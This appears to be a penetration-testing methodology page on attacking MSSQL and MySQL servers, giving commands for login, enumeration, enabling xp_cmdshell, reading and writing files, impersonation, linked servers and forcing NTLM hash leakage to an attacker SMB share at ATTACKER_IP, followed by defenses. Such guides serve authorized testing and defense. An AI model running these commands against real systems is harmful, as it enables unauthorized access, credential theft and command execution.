---
layout: page
title: "Database Attacks"
subtitle: "MSSQL and MySQL access, privilege abuse, file operations and hash capture"
permalink: /methodology/services-attacks/database-attacks/
---

MSSQL and MySQL are relational database systems that store data in tables, rows and columns. Databases often hold credentials, tokens and configuration, and the database account privileges determine what else can be reached: command execution, file read and write, network access and identity impersonation. This page follows the path from a valid login to the highest-impact action the account allows.

## Workflow

1. Identify the database service and version with banner grabbing.
2. Authenticate with known or sprayed credentials.
3. Enumerate databases, tables and the current user's privileges.
4. Check for command execution, file read and write, and linked servers.
5. Test impersonation and linked-server paths for privilege escalation.
6. Capture the service account hash where the service can reach an attacker SMB listener.

## Enumeration

```bash
nmap -Pn -sV -sC -p1433 TARGET_IP
nmap -Pn -sV -sC -p3306 TARGET_IP
```

Default ports are TCP 1433 and UDP 1434 for MSSQL, TCP 3306 for MySQL. A hidden MSSQL instance can listen on TCP 2433.

## Connecting

```bash
mysql -u USERNAME -pPASSWORD -h TARGET_IP
sqsh -S TARGET_IP -U USERNAME -P 'PASSWORD' -h
mssqlclient.py -p 1433 USERNAME@TARGET_IP
```

```cmd
sqlcmd -S SERVER_NAME -U USERNAME -P 'PASSWORD' -y 30 -Y 30
mysql.exe -u USERNAME -pPASSWORD -h TARGET_IP
```

For Windows authentication, specify the domain or host, for example `DOMAIN\\USERNAME` or `.\\USERNAME` for a local account.

## Enumeration queries

```text
SHOW DATABASES;
USE DATABASE_NAME;
SHOW TABLES;
SELECT * FROM users;
```

In `sqlcmd` or `sqsh`, MSSQL statements end with `GO`, and metadata comes from `master.dbo.sysdatabases` or `INFORMATION_SCHEMA.TABLES`.

Default system databases are a useful orientation point. MySQL has `mysql`, `information_schema`, `performance_schema` and `sys`. MSSQL has `master`, `msdb`, `model`, `resource` and `tempdb`.

## Command execution

`xp_cmdshell` runs operating system commands from SQL Server with the rights of the SQL service account. It is disabled by default and must be enabled by an account with sufficient rights:

```text
EXECUTE sp_configure 'show advanced options', 1
RECONFIGURE
EXECUTE sp_configure 'xp_cmdshell', 1
RECONFIGURE
xp_cmdshell 'whoami'
```

## File read and write

MSSQL can read any file that the service account can access:

```text
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
```

MySQL does not read arbitrary files, but `LOAD_FILE` works when the account has the `FILE` privilege and `secure_file_priv` permits the path. Check the variable first:

```text
SHOW VARIABLES LIKE "secure_file_priv";
```

An empty value means there is no restriction. A directory means file operations are limited to it, and `NULL` disables them.

MySQL can write a file with `SELECT ... INTO OUTFILE` when the web root is writable. MSSQL can write files through the OLE Automation stored procedures after enabling `Ole Automation Procedures`, which also requires administrative rights. Writing a server-side script into a web-served directory is a common route to command execution, so always confirm the write location with the client before testing.

## Hash capture

The undocumented `xp_dirtree` and `xp_subdirs` procedures list directories over SMB. Pointing them at an attacker share forces the service account to authenticate, which exposes its NTLMv2 hash.

```text
EXEC master..xp_dirtree '\\ATTACKER_IP\share\'
```

```bash
sudo impacket-smbserver share ./ -smb2support
```

Run the SMB listener before executing the procedure. Crack the captured NetNTLMv2 hash with Hashcat mode 5600.

## Impersonation and linked servers

The `IMPERSONATE` permission lets a login take on another login's rights for the session. Find impersonable logins, then check whether the current user already holds sysadmin:

```text
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';
SELECT IS_SRVROLEMEMBER('sysadmin');
EXECUTE AS LOGIN = 'LOGIN_NAME';
```

Linked servers let one SQL instance run statements on another. List them and then pass commands through:

```text
SELECT srvname, isremote FROM sysservers;
EXECUTE('SELECT SYSTEM_USER, IS_SRVROLEMEMBER(''sysadmin'')') AT [LINKED_SERVER];
```

> Run `EXECUTE AS LOGIN` from the master database, because every user has access to it by default. Revert the context with `REVERT` after testing.
{: .tip }

## What to look for

- Readable tables named users, accounts, settings or configuration.
- `xp_cmdshell` already enabled, or the ability to enable it.
- Impersonable `sa` or other sysadmin logins.
- Linked servers that authenticate as a privileged remote login.
- A MySQL `secure_file_priv` value that is empty.

## Pitfalls

- MSSQL requires `GO` between statements in `sqlcmd` and `sqsh`, while MySQL does not.
- Enabling `xp_cmdshell` or Ole Automation changes server configuration. Record the change and revert it.
- Hash capture only succeeds when the service account can reach the listener over SMB.

> Least-privilege service accounts and disabled `xp_cmdshell` are the controls that stop most of these paths.
{: .info }

## Defense and prevention

Assign least-privilege accounts, disable `xp_cmdshell` and Ole Automation unless required, set `secure_file_priv`, restrict outbound SMB from database servers, remove unneeded `IMPERSONATE` grants and linked servers, and avoid running services as domain administrators. See the [services prevention](/methodology/services-attacks/prevention/) page.
